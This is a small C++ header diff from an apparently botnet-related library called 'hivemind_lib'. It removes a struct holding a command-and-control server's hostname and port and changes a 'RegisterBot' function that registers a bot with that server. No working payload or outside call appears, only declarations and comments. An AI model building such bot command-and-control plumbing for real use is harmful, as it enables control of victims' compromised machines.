@@ -3,15 +3,6 @@
 #include <string>
 
 namespace hivemind_lib {
-
-/**
- * @brief Info on where the C&C is located.
- */
-struct CC_Info {
-  int port = 0;
-  const char *hostname{};
-};
-
 /**
  * @brief Enum for available modules
  */
@@ -37,7 +28,7 @@ int AddFunction(void *);
  * @brief Register the bot with the C&C server.
  * @param info The information needed to connect to the C&C.
  */
-void RegisterBot(CC_Info info);
+void RegisterBot();
 //Start comms
 /**
  * @brief Start the loop calling to the C&C.
